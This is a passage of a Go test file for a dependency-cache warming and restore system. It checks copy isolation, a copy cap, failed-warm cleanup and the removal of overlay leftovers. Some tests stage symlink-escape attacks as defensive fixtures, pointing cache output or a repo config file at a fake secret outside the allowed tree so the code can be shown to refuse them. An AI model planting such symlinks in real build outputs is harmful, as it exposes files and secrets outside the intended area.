	if err := h.m.WarmRepo(context.Background(), "o/r"); err != nil {
		t.Fatal(err)
	}
	req, _ := h.run(t, "r", map[string]string{"go.sum": "default-branch deps\n"})
	g, err := h.m.Restore(context.Background(), req)
	if err != nil {
		t.Fatal(err)
	}
	if len(g.Mounts) != 0 {
		t.Fatal("overlay mounts without overlay")
	}
	p := filepath.Join(req.Home, "go", "pkg", "mod", "dep@v1", "dep.go")
	if b, err := os.ReadFile(p); err != nil || string(b) != "from default-branch deps\n" {
		t.Fatalf("copy: %q %v", b, err)
	}
	// The run's copy is its own: writing it leaves the shared one alone.
	write(t, p, "changed")
	e, _, _ := h.m.Store.Lookup("o/r", "go", "x", []string{"go-"})
	if b, _ := os.ReadFile(filepath.Join(e.Dir, "data", "home", "go", "pkg", "mod", "dep@v1", "dep.go")); string(b) != "from default-branch deps\n" {
		t.Fatal("a copy-restored write reached the store")
	}
	// Over the copy cap, a miss.
	h.m.CopyMax = 1
	req2, _ := h.run(t, "r2", map[string]string{"go.sum": "default-branch deps\n"})
	if _, err := h.m.Restore(context.Background(), req2); err != nil {
		t.Fatal(err)
	}
	if _, err := os.Stat(filepath.Join(req2.Home, "go", "pkg", "mod", "dep@v1", "dep.go")); err == nil && !cloneSupported(t) {
		t.Fatal("copied past the cap")
	}
}

// cloneSupported reports a filesystem whose clones are not counted
// against the copy cap.
func cloneSupported(t *testing.T) bool {
	d := t.TempDir()
	write(t, filepath.Join(d, "a"), "x")
	ok, _ := cloneFile(filepath.Join(d, "a"), filepath.Join(d, "b"), 0o644)
	return ok || cloneDir(filepath.Join(d, "a"), filepath.Join(d, "c"))
}

func TestWarmFailurePublishesNothing(t *testing.T) {
	h := newHarness(t, true)
	h.m.Warm = func(ctx context.Context, w WarmRun) error {
		write(t, filepath.Join(w.Home, "go", "pkg", "mod", "half"), "x")
		return errors.New("exit 1")
	}
	if err := h.m.WarmRepo(context.Background(), "o/r"); err == nil {
		t.Fatal("no error")
	}
	if l := h.m.Store.List(); len(l) != 0 {
		t.Fatalf("published %v", l)
	}
	if ents, _ := os.ReadDir(filepath.Join(h.m.Store.Dir, ".warm")); len(ents) != 0 {
		t.Fatalf("warm scratch left: %v", ents)
	}
}

func TestWarmRefusesSymlinkedOutput(t *testing.T) {
	h := newHarness(t, true)
	secret := t.TempDir()
	write(t, filepath.Join(secret, "key"), "SECRET")
	h.m.Warm = func(ctx context.Context, w WarmRun) error {
		if w.Cache != "go" {
			return nil
		}
		// A warm that fills one path properly and points the other at
		// something outside it.
		write(t, filepath.Join(w.Home, ".cache", "go-build", "ab", "x"), "obj")
		if err := os.MkdirAll(filepath.Join(w.Home, "go", "pkg"), 0o755); err != nil {
			return err
		}
		return os.Symlink(secret, filepath.Join(w.Home, "go", "pkg", "mod"))
	}
	_ = h.m.WarmRepo(context.Background(), "o/r")
	for _, e := range h.m.Store.List() {
		if e.Name == "go" {
			t.Fatalf("published a symlinked path: %+v", e)
		}
	}
}

func TestRemoveAllHandlesOverlayLeftovers(t *testing.T) {
	d := t.TempDir()
	p := filepath.Join(d, "x", "work", "work", "incompat")
	if err := os.MkdirAll(p, 0o700); err != nil {
		t.Fatal(err)
	}
	write(t, filepath.Join(d, "x", "ro", "f"), "x")
	outside := filepath.Join(t.TempDir(), "o")
	write(t, outside, "x")
	_ = os.Chmod(outside, 0o400)
	// The link sits in a read-only directory, so the first removal pass
	// cannot unlink it and the chmod walk meets it.
	if err := os.Symlink(outside, filepath.Join(d, "x", "ro", "link")); err != nil {
		t.Fatal(err)
	}
	_ = os.Chmod(filepath.Join(d, "x", "ro"), 0o500)
	_ = os.Chmod(filepath.Join(d, "x", "work", "work"), 0)
	if err := RemoveAll(filepath.Join(d, "x")); err != nil {
		t.Fatal(err)
	}
	if fi, err := os.Stat(outside); err != nil || fi.Mode().Perm() != 0o400 {
		t.Fatalf("followed a symlink: %v %v", fi.Mode(), err)
	}
}

// The warm reads the repo file from its default-branch checkout without
// following a symlink anywhere.
func TestReadInTreeRefusesSymlinks(t *testing.T) {
	tree := t.TempDir()
	secret := filepath.Join(t.TempDir(), "secret.yaml")
	write(t, secret, "version: 1\n")
	if err := os.Symlink(secret, filepath.Join(tree, RepoFileName)); err != nil {
		t.Fatal(err)
	}
	if b, err := readInTree(tree, RepoFileName); err == nil {
		t.Fatalf("read through a symlink: %q", b)
	}
	// A link to another file inside the tree is refused too: only the
	// regular file at the root is the repository's file.
	write(t, filepath.Join(tree, "other.yaml"), "version: 1\n")
	if err := os.Remove(filepath.Join(tree, RepoFileName)); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink("other.yaml", filepath.Join(tree, RepoFileName)); err != nil {
		t.Fatal(err)
	}
	if b, err := readInTree(tree, RepoFileName); err == nil {
		t.Fatalf("read through an in-tree symlink: %q", b)
	}
	if b, err := readInTree(t.TempDir(), RepoFileName); err != nil || b != nil {
		t.Fatalf("absent: %q %v", b, err)
	}
}
